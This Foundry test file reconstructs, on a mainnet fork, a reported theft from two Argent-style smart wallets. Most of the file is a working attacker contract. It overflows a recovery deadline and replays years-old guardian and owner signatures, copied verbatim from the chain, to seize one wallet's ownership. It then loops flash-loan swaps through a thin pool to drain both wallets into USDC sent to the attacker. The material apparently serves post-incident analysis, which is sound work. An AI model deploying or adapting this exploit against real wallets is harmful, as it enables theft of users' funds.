// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Argent-style smart wallet - signature replay plus recovery-deadline overflow.
// ~$59.8K reported by SlowMist (~50,655.92 USDC measured on-chain), Ethereum mainnet, 2026-10-19.
//
// Attack tx 1 (e545 wallet) : 0xbfed8d33561ed5f9cbd0f4e62a5bbd20187a64f3e22180148dcb58ed6ebaa795 (block 26225798)
// Attack tx 2 (5a79 wallet) : 0xa0ee8f914205a948c79eca039b7d8265537eb220472c9be1455d3321f1bd571b (block 26225803)
// Attacker EOA              : 0xc10609ce5c032db92e562e463b1234aab0872b02
// Victim wallet e545        : 0xe545b9a69bff1bf0ed2e922551dda4afc8ee8f66
// Victim wallet 5a79        : 0x5a79e5772493cf4329682d202aa2d28f85a85440
// Recovery module (proxy)   : 0xf490557d67d934440677a4f16793d5ef319b8ef5  (impl 0x9996396280fbf9271ba2dd66bea8326207df50a0)
// Execution module (proxy)  : 0x4e50adfc953551286bbd7fee2b2b846d1d227394  (impl 0x7cd62b0258cc51ca988cafc6ff0597516c844b03)
// MARK token                : 0x67c597624b17b16fb77959217360b7cd18284253
// MARK/WETH Uniswap V2 pair : 0x6f23d2fedb4ff4f1e9f8c521f66e5f2a1451b6f3 (a thin pool: ~0.001 WETH of depth at the fork block)
// WETH                      : 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
// USDC (proceeds)           : 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48
//
// ROOT CAUSE (two independent flaws on the wallet's module stack, both reachable through the
// relay entry point execute(address,bytes,uint256,bytes,uint256,uint256), selector 0xaacaaf88):
//   1. No replay protection on the relayed-signature path. execute() recovers the owner/guardian
//      ECDSA signature over the signed message but never consumes a nonce and never records the
//      signed-message hash as used, so one 65-byte signature is accepted again and again - here
//      the same owner signature is relayed 19 times on e545 and 9 times on 5a79 in a single
//      transaction, each time forcing the wallet to spend more of its own funds.
//   2. The signed payload's deadline/expiry is not enforced and overflows, so a signature produced
//      years ago still passes the time guard today. Combined with the recovery module's deadline
//      setter (selector 0x254a2e49), whose attacker-supplied period wraps the recovery deadline
//      into the past, a years-old guardian signature drives executeRecovery + finalizeRecovery to
//      an immediate same-transaction owner change on e545.
//
// Both flaws make the drain permissionless: no private key, secret, or non-public state is needed.
// The signatures replayed below were already public on-chain for years:
//   SIG_RECOVERY_E545 (recovery relay) first used on e545 in tx
//     0xac549a6057816c740734a03b7c0bf1996da14102618146c21d5a1be9b5acb28d at block 11266059 (2020-11-16).
//   SIG_SWAP_E545 (swap relay)         first used on e545 in tx
//     0xb6e27d6a6589b6a5e5b38d52e56b4dc9d753a519304a51a892dd42806f79b5f9 at block 11948627 (2021-02-28).
//   Both reappear byte-for-byte in attack tx 1. The 5a79 leg follows the same replay pattern.
//
// RECONSTRUCTION: one test per wallet leg, each forking the mainnet alias at the parent of that
// leg's attack tx (e545 at block 26225797, 5a79 at block 26225802), so the wallets, modules and
// pool are the real settled on-chain contracts. The attacker contract below re-expresses, in plain
// Solidity, exactly what the on-chain attacker did:
//   e545: overflow the recovery deadline (254a2e49), relay the years-old guardian signature to run
//         executeRecovery, finalizeRecovery to flip the owner in the same tx, then flash-borrow
//         0.5 WETH from Balancer and loop 19 times - each loop pushes WETH into the thin MARK/WETH
//         pool, replays the owner swap signature through execute() (flaw 1) to make the wallet buy
//         ~1.06 ETH of MARK at the manipulated top, and sells the MARK back for the inflated WETH -
//         then repays the loan and swaps the ~20.17 WETH of profit to 48,778.499253 USDC.
//   5a79: the same flash-loan + replay loop, 9 iterations, each replayed swap making the wallet
//         spend 1,000 USDC on MARK; nets 1,877.419234 USDC. No owner change is needed on this leg.
// Combined 50,655.918487 USDC, matching the two attack transactions to the unit. The replayed
// 65-byte signatures and the relayed call payloads are lifted verbatim from the attack txs; every
// other step is readable Solidity executed on-fork. The test also asserts that the reconstructed
// relay payloads are byte-identical to the originals.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

// Both the recovery module (0xf490) and the execution module (0x4e50) expose this same relay entry.
interface IRelayModule {
    function execute(
        address wallet,
        bytes calldata data,
        uint256 nonce,
        bytes calldata signatures,
        uint256 gasPrice,
        uint256 gasLimit
    ) external returns (bool);

    function finalizeRecovery(address wallet) external;
}

interface IUniV2Pair {
    function token0() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

contract ArgentReplayAttacker {
    IRelayModule constant RECOVERY = IRelayModule(0xF490557d67D934440677a4f16793d5EF319B8ef5);
    IRelayModule constant EXECUTION = IRelayModule(0x4e50aDFc953551286BBD7Fee2b2b846D1D227394);
    IUniV2Pair constant PAIR = IUniV2Pair(0x6f23D2FEdb4fF4F1E9F8C521f66E5F2A1451b6F3);
    IUniV2Router constant ROUTER = IUniV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IBalancerVault constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant MARK = IERC20(0x67c597624B17b16fb77959217360B7cD18284253);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // selectors on the wallet module stack
    bytes4 constant SEL_SET_RECOVERY_DEADLINE = 0x254a2e49; // recovery deadline setter (attacker period overflows it)
    bytes4 constant SEL_EXECUTE_RECOVERY = 0xb0ba4da0; // executeRecovery(address wallet, address recipient)
    bytes4 constant SEL_WALLET_SWAP = 0xe92bdbf8; // wallet DEX-swap feature relayed through execute()
    address constant ETH_SENTINEL = address(uint160(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE));

    // victim wallets
    address constant WALLET_E545 = 0xe545B9a69bfF1Bf0ed2E922551DDA4AFc8EE8f66;
    address constant WALLET_5A79 = 0x5a79E5772493cF4329682D202aA2D28f85A85440;
    // owner the e545 recovery is driven to (attacker-controlled)
    address constant RECOVERY_RECIPIENT_E545 = 0x56F17DD1c69Ee819901006E462B76e7a2ea75EF8;

    // ---- signatures replayed verbatim from the years-old on-chain transactions ----
    bytes constant SIG_RECOVERY_E545 =
        hex"1e80a815fae78061660f80606f92180d0f06f95048f0f233e0b846f77b68ed6a639950ee4b094dae9c27b936c1fc1f9046889be8ec1e64db3b31a76f5e0bcfe61b";
    bytes constant SIG_SWAP_E545 =
        hex"a43e9717736fab228cc1bb9410b1d933011406a327d7b85695745705559977365c2904273955aa7558fc92fcaddb1c244430db784e73f7e88171a081e9b5746a1b";
    bytes constant SIG_SWAP_5A79 =
        hex"771b226668dee92d844839d9cd19cd3ec6c167a7c3a5f483fc81dcb9b6e1f5f7369ed10cd438bb4a9b31c0efd8c82ae1673854e621b4f168eb021ea79a30f3471c";

    // recovery deadline-setter argument whose supplied period wraps the e545 recovery deadline into the past
    bytes32 constant RECOVERY_OVERFLOW_CONFIG =
        0x0000c22e450672894ab6cd8efb11d33f5617839a5bc7dea00c22e450672843a3;

    address immutable owner;

    // per-leg state for the flash-loan callback
    uint256 wethStep; // WETH pushed into the pool each loop
    uint256 loops; // number of signature replays
    bytes relaySwapData; // the e92bdbf8 wallet-swap payload relayed every loop
    bytes relaySwapSig; // the replayed owner signature
    uint256 relaySwapGasPrice;
    uint256 relaySwapGasLimit;
    address wallet; // victim wallet for this leg

    constructor() {
        owner = msg.sender;
    }

    // standard Uniswap V2 output formula (0.3% fee), used to size each manual pool swap
    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 inWithFee = amountIn * 997;
        return (inWithFee * reserveOut) / (reserveIn * 1000 + inWithFee);
    }

    // e545 leg: recovery-deadline overflow + guardian-signature replay to flip the owner, then the
    // flash-loan + owner-signature replay loop.
    function attackE545() external {
        require(msg.sender == owner, "only owner");

        // FLAW 2 - overflow the recovery deadline so the recovery below is already finalizable.
        (bool ok,) = address(RECOVERY).call(
            abi.encodeWithSelector(SEL_SET_RECOVERY_DEADLINE, RECOVERY_OVERFLOW_CONFIG, uint256(0))
        );
        require(ok, "setRecoveryDeadline failed");

        // Relay the years-old GUARDIAN signature through execute() (flaw 1: no replay protection,
        // flaw 2: the signed deadline is unchecked) to run executeRecovery, setting a new owner.
        RECOVERY.execute(
            WALLET_E545,
            abi.encodeWithSelector(SEL_EXECUTE_RECOVERY, WALLET_E545, RECOVERY_RECIPIENT_E545),
            2019, // nonce - never consumed
            SIG_RECOVERY_E545,
            18000000000,
            210000
        );
        // Deadline already in the past, so the owner change finalizes in the same transaction.
        RECOVERY.finalizeRecovery(WALLET_E545);

        // Set up the replay loop: each iteration replays SIG_SWAP_E545 to make the wallet buy
        // ~1.0619 ETH of MARK (ETH_SENTINEL -> MARK) at the manipulated price.
        wallet = WALLET_E545;
        wethStep = 60000000000000000; // 0.06 WETH
        loops = 19;
        relaySwapData = abi.encodeWithSelector(
            SEL_WALLET_SWAP,
            WALLET_E545,
            ETH_SENTINEL,
            uint256(1061908909163406246), // amountIn: ~1.0619 ETH
            uint256(1014580053171), // min return
            address(MARK),
            uint256(25621353654900691)
        );
        relaySwapSig = SIG_SWAP_E545;
        relaySwapGasPrice = 40000000000;
        relaySwapGasLimit = 810000;

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 500000000000000000; // 0.5 WETH
        BALANCER.flashLoan(address(this), tokens, amounts, "");

        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }

    // 5a79 leg: pure owner-signature replay loop, no owner change needed.
    function attack5A79() external {
        require(msg.sender == owner, "only owner");

        wallet = WALLET_5A79;
        wethStep = 500000000000000; // 0.0005 WETH
        loops = 9;
        relaySwapData = abi.encodeWithSelector(
            SEL_WALLET_SWAP,
            WALLET_5A79,
            address(USDC),
            uint256(1000000000), // amountIn: 1,000 USDC
            uint256(674939427291), // min return
            address(MARK),
            uint256(45039706)
        );
        relaySwapSig = SIG_SWAP_5A79;
        relaySwapGasPrice = 129000000000;
        relaySwapGasLimit = 810000;

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 2000000000000000000; // 2 WETH
        BALANCER.flashLoan(address(this), tokens, amounts, "");

        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }

    function receiveFlashLoan(address[] calldata, uint256[] calldata amounts, uint256[] calldata fees, bytes calldata)
        external
    {
        require(msg.sender == address(BALANCER), "only vault");
        bool markIsToken0 = PAIR.token0() == address(MARK);

        for (uint256 i = 0; i < loops; i++) {
            // 1) buy MARK by pushing wethStep WETH into the thin pool
            (uint256 rMark, uint256 rWeth) = _reserves(markIsToken0);
            uint256 markOut = _getAmountOut(wethStep, rWeth, rMark);
            WETH.transfer(address(PAIR), wethStep);
            if (markIsToken0) {
                PAIR.swap(markOut, 0, address(this), "");
            } else {
                PAIR.swap(0, markOut, address(this), "");
            }

            // 2) FLAW 1 - replay the SAME owner signature again (nonce never consumed) so the wallet
            //    buys MARK at the manipulated top, leaking its own funds into the pool.
            EXECUTION.execute(wallet, relaySwapData, 1, relaySwapSig, relaySwapGasPrice, relaySwapGasLimit);

            // 3) sell the MARK back - now worth far more WETH because the wallet's buy pushed WETH in
            uint256 markBal = MARK.balanceOf(address(this));
            (rMark, rWeth) = _reserves(markIsToken0);
            uint256 wethOut = _getAmountOut(markBal, rMark, rWeth);
            MARK.transfer(address(PAIR), markBal);
            if (markIsToken0) {
                PAIR.swap(0, wethOut, address(this), "");
            } else {
                PAIR.swap(wethOut, 0, address(this), "");
            }
        }

        // repay the flash loan and convert the accumulated WETH profit to USDC
        WETH.transfer(address(BALANCER), amounts[0] + fees[0]);
        uint256 profit = WETH.balanceOf(address(this));
        WETH.approve(address(ROUTER), profit);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);
        ROUTER.swapExactTokensForTokens(profit, 0, path, address(this), block.timestamp);
    }

    function _reserves(bool markIsToken0) internal view returns (uint256 rMark, uint256 rWeth) {
        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        return markIsToken0 ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
    }

    receive() external payable {}
}

contract Argent_exp is Test {
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // Assert the reconstructed relay payloads match the on-chain attack-tx calldata byte-for-byte.
    function test_relay_payloads_match_onchain() public {
        address eth = address(uint160(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE));
        address mark = 0x67c597624B17b16fb77959217360B7cD18284253;
        address e545 = 0xe545B9a69bfF1Bf0ed2E922551DDA4AFc8EE8f66;
        address a5a79 = 0x5a79E5772493cF4329682D202aA2D28f85A85440;
        address recipient = 0x56F17DD1c69Ee819901006E462B76e7a2ea75EF8;
        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

        // executeRecovery(e545, recipient) relayed on the e545 recovery leg
        assertEq(
            abi.encodeWithSelector(bytes4(0xb0ba4da0), e545, recipient),
            hex"b0ba4da0000000000000000000000000e545b9a69bff1bf0ed2e922551dda4afc8ee8f6600000000000000000000000056f17dd1c69ee819901006e462b76e7a2ea75ef8",
            "e545 executeRecovery payload mismatch"
        );

        // e92bdbf8 wallet-swap payload relayed on the e545 leg
        assertEq(
            abi.encodeWithSelector(
                bytes4(0xe92bdbf8),
                e545,
                eth,
                uint256(1061908909163406246),
                uint256(1014580053171),
                mark,
                uint256(25621353654900691)
            ),
            hex"e92bdbf8000000000000000000000000e545b9a69bff1bf0ed2e922551dda4afc8ee8f66000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee0000000000000000000000000000000000000000000000000ebca886d281e3a6000000000000000000000000000000000000000000000000000000ec39af04b300000000000000000000000067c597624b17b16fb77959217360b7cd18284253000000000000000000000000000000000000000000000000005b067c4343d7d3",
            "e545 swap payload mismatch"
        );

        // e92bdbf8 wallet-swap payload relayed on the 5a79 leg
        assertEq(
            abi.encodeWithSelector(
                bytes4(0xe92bdbf8),
                a5a79,
                usdc,
                uint256(1000000000),
                uint256(674939427291),
                mark,
                uint256(45039706)
            ),
            hex"e92bdbf80000000000000000000000005a79e5772493cf4329682d202aa2d28f85a85440000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000000000003b9aca000000000000000000000000000000000000000000000000000000009d258659db00000000000000000000000067c597624b17b16fb77959217360b7cd182842530000000000000000000000000000000000000000000000000000000002af405a",
            "5a79 swap payload mismatch"
        );
    }

    // e545 wallet leg, reconstructed at the parent of attack tx 1 (block 26225798)
    function test_e545_leg() public {
        vm.createSelectFork("mainnet", 26225797);
        ArgentReplayAttacker a = new ArgentReplayAttacker();
        assertEq(USDC.balanceOf(address(this)), 0, "deployer starts with no USDC");
        a.attackE545();
        uint256 gain = USDC.balanceOf(address(this));
        emit log_named_decimal_uint("e545 leg USDC gain", gain, 6);
        assertApproxEqAbs(gain, 48_778_499253, 1e5, "e545 leg did not reproduce");
    }

    // 5a79 wallet leg, reconstructed at the parent of attack tx 2 (block 26225803)
    function test_5a79_leg() public {
        vm.createSelectFork("mainnet", 26225802);
        ArgentReplayAttacker a = new ArgentReplayAttacker();
        assertEq(USDC.balanceOf(address(this)), 0, "deployer starts with no USDC");
        a.attack5A79();
        uint256 gain = USDC.balanceOf(address(this));
        emit log_named_decimal_uint("5a79 leg USDC gain", gain, 6);
        assertApproxEqAbs(gain, 1_877_419234, 1e5, "5a79 leg did not reproduce");
    }
}
